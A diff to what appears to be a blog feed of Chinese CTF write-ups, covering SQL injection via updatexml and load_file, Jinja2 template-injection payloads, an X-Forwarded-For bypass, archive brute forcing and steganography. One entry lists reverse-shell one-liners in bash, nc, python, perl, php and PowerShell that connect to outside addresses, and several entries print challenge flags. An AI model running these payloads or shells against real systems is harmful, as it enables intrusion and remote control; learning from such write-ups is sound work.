@@ -4,6 +4,84 @@
   
   
   <entry>
+    <title>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</title>
+    <link href="/2020/05/06/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5%5DCyberPunk/"/>
+    <url>/2020/05/06/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5%5DCyberPunk/</url>
+    
+    <content type="html"><![CDATA[<h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200506210636892.png" srcset="/img/loading.gif" alt="image-20200506210636892"></p><p>发现敏感信息。</p><p>利用PHP伪协议读取源码</p><p><code>index.php：</code></p><pre><code class="PHP">&lt;?phpini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);// $file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);if (isset($file)){    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {        echo(&#39;no way!&#39;);        exit;    }    @include($file);}?&gt;</code></pre><p>这里的正则因为是/i对大小写不敏感所以我没办法绕过。</p><p>search.php</p><pre><code>&lt;?phprequire_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){    $msg = &#39;&#39;;    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;    $user_name = $_POST[&quot;user_name&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){         $msg = &#39;no sql inject!&#39;;    }else{        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;        $fetch = $db-&gt;query($sql);    }    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){        $row = $fetch-&gt;fetch_assoc();        if(!$row) {            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        }        $msg = &quot;&lt;p&gt;å§å:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, çµè¯:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, å°å:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;    } else {        $msg = &quot;æªæ¾å°è®¢å!&quot;;    }}else {    $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;}?&gt;</code></pre><p>index.php中无法实现绕过，考虑使用二次注入。</p><p>会发现查询页面会有回显，修改页面存在报错。通过查询页面可以知道，只有地址存在’。</p><blockquote><p>1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)<em>#</em></p></blockquote><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200506224723491.png" srcset="/img/loading.gif" alt="image-20200506224723491"></p><p>利用load_file读取flag.txt</p><blockquote><p>errorXPATH syntax error: ‘~flag{8fbc88cb-5172-4418-b655-f6’</p></blockquote><p>发现显示的不完整。</p><blockquote><p>1’ and updatexml(1,concat(0x7e,(select right(load_file(‘/flag.txt’),20)),0x7e),1)#</p></blockquote><blockquote><p>errorXPATH syntax error: ‘~-b655-f6bb7aabe0fc} ~’</p></blockquote>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[MRCTF2020]PYWebsite</title>
+    <link href="/2020/05/05/%5BMRCTF2020%5DPYWebsite/"/>
+    <url>/2020/05/05/%5BMRCTF2020%5DPYWebsite/</url>
+    
+    <content type="html"><![CDATA[<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>F12发现了</p><blockquote><p>/js/md5.js</p></blockquote><table><thead><tr><th>function enc(code){</th><th></th></tr></thead><tbody><tr><td></td><td>hash = hex_md5(code);</td></tr><tr><td></td><td>return hash;</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>function validate(){</td></tr><tr><td></td><td>var code = document.getElementById(“vcode”).value;</td></tr><tr><td></td><td>if (code != “”){</td></tr><tr><td></td><td>if(hex_md5(code) == “0cd4da0223c0b280829dc3ea458d655c”){</td></tr><tr><td></td><td>alert(“您通过了验证！”);</td></tr><tr><td></td><td>window.location = “./flag.php”</td></tr><tr><td></td><td>}else{</td></tr><tr><td></td><td>alert(“你的授权码不正确！”);</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>}else{</td></tr><tr><td></td><td>alert(“请输入授权码”);</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td></td></tr><tr><td></td><td>}</td></tr></tbody></table><p>说输入code与某值进行比较，相等就出现flag。所以现在就是分析加密函数。</p><blockquote><p> if(hex_md5(code) == “0cd4da0223c0b280829dc3ea458d655c”)</p></blockquote><blockquote><pre><code>function hex_md5(s){ return binl2hex(core_md5(str2binl(s), s.length * 8));}</code></pre></blockquote><p>可以看到hex_md5就是通过core_md5加密str2bin1加密后的code先去看看strbin函数</p><pre><code>function str2binl(str){  var bin = Array();  var mask = (1 &lt;&lt; 8) - 1;//mask=255  for(var i = 0; i &lt; str.length * 8; i += 8)    bin[i&gt;&gt;5] |= (str.charCodeAt(i / chrsz) &amp; mask) &lt;&lt; (i%32);  return bin;}</code></pre><p>额，算了好麻烦。。。换个思路直接读取flag.php(强行狡辩，其实我忘记可以直接读取的了)</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200505180527740.png" srcset="/img/loading.gif" alt="image-20200505180527740"></p><p>xff绕过。</p><p>flag{abd61860-ad51-41aa-8a19-6d7c43cbac68}</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[GYCTF2020]FlaskApp</title>
+    <link href="/2020/05/03/%5BGYCTF2020%5DFlaskApp/"/>
+    <url>/2020/05/03/%5BGYCTF2020%5DFlaskApp/</url>
+    
+    <content type="html"><![CDATA[<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>在提示页面f12发现了一段神奇的cookie</p><blockquote><p>eyJjc3JmX3Rva2VuIjoiOTAzM2UwYTY2YzhhOTM3N2NjYmNlMTIwNDcyZmZkYWVhMTg3YTljNyJ9.Xq5hWQ.wd9G8fR8lwO4P_W-GS9Dxbp70kQ</p></blockquote><p>在网站的解密页面解密一下。突然就跳转到了一个神奇的页面</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200503171137795.png" srcset="/img/loading.gif" alt="image-20200503171137795"></p><p>发现这是WSGI</p><p>在加密界面输入12，解密解密成功回显12</p><p>这里有个脚本</p><blockquote><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}> ```![image-20200503183556194](C:\Users\ykpc\AppData\Roaming\Typora\typora-user-images\image-20200503183556194.png)`{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}`最后用切片操作读取flag`{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}`</code></pre></blockquote><p>下面是一些链接：</p><p><a href="https://www.cnblogs.com/zaqzzz/p/10251892.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/10251892.html</a></p><p><a href="https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/</a></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[FBCTF2019]RCEService</title>
+    <link href="/2020/05/02/%5BFBCTF2019%5DRCEService/"/>
+    <url>/2020/05/02/%5BFBCTF2019%5DRCEService/</url>
+    
+    <content type="html"><![CDATA[<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200502191258431.png" srcset="/img/loading.gif" alt="image-20200502191258431"></p><p>当输入{“cmd”:”ls”}有回显，但是不能读取。</p><p>本来想拼接字符串的但是没有成功。</p><p><a href="https://xz.aliyun.com/t/5399" target="_blank" rel="noopener">https://xz.aliyun.com/t/5399</a></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[V&amp;N2020 公开赛]CHECKIN</title>
+    <link href="/2020/05/02/%5BV&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DCHECKIN/"/>
+    <url>/2020/05/02/%5BV&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DCHECKIN/</url>
+    
+    <content type="html"><![CDATA[<h2 id="V-amp-N2020-公开赛-CHECKIN"><a href="#V-amp-N2020-公开赛-CHECKIN" class="headerlink" title="[V&amp;N2020 公开赛]CHECKIN"></a>[V&amp;N2020 公开赛]CHECKIN</h2><p>看到这题的时候并不会做。考点是反弹shell。</p><p>收集一点可能用上的反弹shell命令</p><p><strong><em>1\</em></strong>|<strong><em>0**</em></strong>bash**</p><pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></pre><p><strong><em>2\</em></strong>|<strong><em>0**</em></strong>nc**</p><pre><code>nc -e /bin/sh ip port</code></pre><p><strong><em>3\</em></strong>|<strong><em>0**</em></strong>python**</p><pre><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></pre><p><strong><em>4\</em></strong>|<strong><em>0**</em></strong>perl**</p><pre><code>perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;ip:port&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;174.0.224.117:8080&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre><p><strong><em>5\</em></strong>|<strong><em>0**</em></strong>php**</p><pre><code>php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p><strong><em>6\</em></strong>|<strong><em>0**</em></strong>PowerShell**</p><pre><code>[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(&#39;$c=New-Object Net.Sockets.TCPClient(&quot;174.1.52.162&quot;,6666);$s=$c.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$s.Read($bytes, 0, $bytes.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $d 2&gt;&amp;1 | Out-String );$sb2=$sb+&#39;&#39;PS &#39;&#39;+(pwd).Path+&#39;&#39;&gt; &#39;&#39;;$sb=([Text.Encoding]::Default).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()&#39;))powershell -nop -enc {reverse shell command}</code></pre><p>参考：<a href="https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html" target="_blank" rel="noopener">https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p><p>连入后因为：</p><p>当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里。</p><p>执行</p><p><code>python3 -c &quot;import os;[os.system(&#39;cat /proc/&#39;+str(i)+&#39;/fd/&#39;+str(j)) for i in range(20) for j in range(10)];&quot;</code></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>BUUCTF misc部分解题</title>
+    <link href="/2020/04/30/BUUCTF%20misc%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98/"/>
+    <url>/2020/04/30/BUUCTF%20misc%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98/</url>
+    
+    <content type="html"><![CDATA[<h1 id="BUUCTF-misc部分解题"><a href="#BUUCTF-misc部分解题" class="headerlink" title="BUUCTF misc部分解题"></a>BUUCTF misc部分解题</h1><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>是个exe文件利用file进行查看</p><blockquote><p>$ file KEY.exe<br>KEY.exe: ASCII text, with very long lines, with no line terminators</p></blockquote><p>将后缀名改为txt。</p><p>bases64解密然后改为png，发现没有用。</p><p>直接复制到url栏试试看。扫描二维码就可以了。</p><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200430152341644.png" srcset="/img/loading.gif" alt="image-20200430152341644"></p><p>IHDR后面的8个字节为图片的宽高修改宽高，就出现了flag。</p><h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>根据提示，是压缩包破解的事情。直接爆破,在kali中输入。</p><blockquote><p>1、安装rarcrack</p><pre><code class="bash">apt-get install rarcrack</code></pre><p>2、指定文件进行爆破，其中type有 rar、zip、7z 三种类型</p><pre><code class="bash">rarcrack 文件名 --threads 50 --type rar</code></pre></blockquote><p>爆破出来是</p><blockquote><p>ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=</p></blockquote><p>flag{70354300a5100ba78068805661b93a5c}</p><h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>用png打开图片，winhex打开直接就发现了。</p><blockquote><p>flag{stego_is_s0_bor1ing}</p></blockquote><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><blockquote><p>flag{97314e7864a8f62627b26f3f998c37f1}</p></blockquote><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>题目直接写出来了，<strong>LSB隐写</strong></p><p>使用工具<strong>Stegsolve</strong>分析，这个工具是misc最常用工具，需要配置java环境，配置教程和资源在百度比较容易找到，这里不再提供。</p><p>查看<strong>各个色道</strong>，没有发现隐藏信息，</p><p>点击<strong>Analyse→Data Extract</strong></p><p>选中<strong>LSB First</strong></p><p>参数如下时发现隐藏信息,有一个明显的<strong>PNG头</strong>，<strong>save bin</strong>提取出来保存为图片</p><p><img src="https://blog.xiafeng2333.top/content/images/2019/09/15.png" srcset="/img/loading.gif" alt="15"></p><p>是一张二维码，</p><p><img src="https://blog.xiafeng2333.top/content/images/2019/09/16.png" srcset="/img/loading.gif" alt="16"></p><p>扫码得到flag</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>MySQL基础课堂笔记</title>
     <link href="/2020/04/29/MySQL%E5%9F%BA%E7%A1%80%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/"/>
     <url>/2020/04/29/MySQL%E5%9F%BA%E7%A1%80%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/</url>
